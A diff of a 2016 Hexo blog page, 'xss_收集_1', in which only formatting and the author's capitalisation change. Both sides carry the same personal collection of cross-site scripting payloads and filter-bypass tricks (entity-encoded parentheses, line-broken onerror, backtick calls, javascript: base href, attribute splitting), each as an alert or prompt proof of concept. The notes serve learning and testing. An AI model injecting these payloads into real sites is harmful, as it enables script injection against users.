@@ -7,7 +7,7 @@
     <title>xss_收集_1 | A1exlism</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
-    <meta name="author" content="a1ex">
+    <meta name="author" content="A1ex">
     
 
     
@@ -49,7 +49,7 @@
     <link rel="apple-touch-icon" href="/img/a1exlism.jpg">
     <link rel="apple-touch-icon-precomposed" href="/img/a1exlism.jpg">
     
-    <link rel="stylesheet" href="/css/style.css" type="text/css">
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
   <body>
@@ -101,7 +101,7 @@
   </h1>
   <p class="article-author">By
        
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="a1ex" target="_blank" itemprop="author">a1ex</a>
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
     <time datetime="2016-05-02T16:00:00.000Z" itemprop="datePublished"> 发表于 05-03-2016</time>
@@ -117,52 +117,52 @@
 		
 		</div>
 		
-		<h2 id="记录碰到过的XSS">记录碰到过的XSS</h2><p>序号乱了,算了</p>
+		<h2 id="记录碰到过的XSS"><a href="#记录碰到过的XSS" class="headerlink" title="记录碰到过的XSS"></a>记录碰到过的XSS</h2><p>序号乱了,算了</p>
 <ol>
 <li>()=被过滤   <svg>实体编码</svg></li>
 </ol>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="cal">alert&amp;<span class="string">#40</span>/<span class="number">1</span>/&amp;<span class="string">#41</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>      // Works With All Browsers</span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line">) is html encoded to &amp;#41</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;      // Works With All Browsers</span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line">) is html encoded to &amp;#41</span><br></pre></td></tr></table></figure>
 <ol>
 <li>浏览器Prasing 先闭合再找新标签</li>
 </ol>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">value</span>=<span class="value">'&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">'&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ol>
-<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">value</span>=<span class="value">"'输出点'"</span> <span class="attribute">type</span>=<span class="value">"text"</span>&gt;</span></span><br><span class="line">XSS_payload=  "type=&amp;#105;&amp;#109;&amp;#97;&amp;#103;&amp;#101; src onerror</span><br><span class="line">="prompt(1)</span><br></pre></td></tr></table></figure>
+<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"'输出点'"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">XSS_payload=  "type=&amp;#105;&amp;#109;&amp;#97;&amp;#103;&amp;#101; src onerror</span><br><span class="line">="prompt(1)</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<p>x————-onerror和=之间换行仍然可以解析,—————可以绕过正则————-</p>
+<p>x———onerror和=之间换行仍然可以解析,———-可以绕过正则———</p>
 <ol>
-<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">autofocus</span>=<span class="value">alert(</span>/<span class="attribute">xss</span>/)&gt;</span></span><br></pre></td></tr></table></figure>
+<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">autofocus</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>chrome base标签,不可覆盖 </p>
 </li>
 </ol>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">base</span> <span class="attribute">href</span>=<span class="value">"javascript:\"</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"//%0aalert(1);//"</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"javascript:\"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//%0aalert(1);//"</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ol>
 <li>img source可分开写</li>
 </ol>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span><span class="tag">&lt;<span class="title">source</span> <span class="attribute">srcset</span>=<span class="value">1</span>&gt;</span><span class="tag">&lt;<span class="title">img</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">1</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ol>
-<li><strong>————————ES6 神招 backtick ` 直接代替()——————————</strong></li>
+<li><strong>—————-ES6 神招 backtick ` 直接代替()——————–</strong></li>
 </ol>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="autohotkey">alert<span class="escape">`1</span>`</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ol>
 <li>Chrome Only</li>
 </ol>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> ?<span class="attribute">itworksonchrome</span>?\/<span class="attribute">onerror</span> = <span class="attribute">alert</span>(<span class="attribute">1</span>)&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="title">img</span>/<span class="attribute">src</span>/<span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> ?<span class="attr">itworksonchrome</span>?\/<span class="attr">onerror</span> = <span class="string">alert(1)</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>13.</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">onload</span>=<span class="value">alert</span>/**/(<span class="attribute">1</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert/**/(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ol>
-<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>JS中</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">)() <span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line">alert</span><br><span class="line">(<span class="number">1</span>) <span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line">aler</span><br><span class="line">t(<span class="number">1</span>) <span class="comment">//aler Not defined</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>img利用 </p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onerror='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="attr">comment</span>" <span class="attr">title</span>=<span class="string">""</span><span class="attr">onerror</span>=<span class="string">'/*"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="comment" title="*/prompt(1)'</span>"&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<h2 id="部分Reference">部分Reference</h2><p><a href="http://lcx.cc/?i=4427" target="_blank" rel="external">核总</a><br><a href="http://www.cnblogs.com/hookjoy/p/3612044.html" target="_blank" rel="external">hookjoy</a></p>
+<h2 id="部分Reference"><a href="#部分Reference" class="headerlink" title="部分Reference"></a>部分Reference</h2><p><a href="http://lcx.cc/?i=4427" target="_blank" rel="external">核总</a><br><a href="http://www.cnblogs.com/hookjoy/p/3612044.html" target="_blank" rel="external">hookjoy</a></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -322,7 +322,7 @@
 		<p class="copyright">
 		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2016 
 		
-		<a href="/about" target="_blank" title="a1ex">a1ex</a>
+		<a href="/about" target="_blank" title="A1ex">A1ex</a>
 		
 		
 		</p>
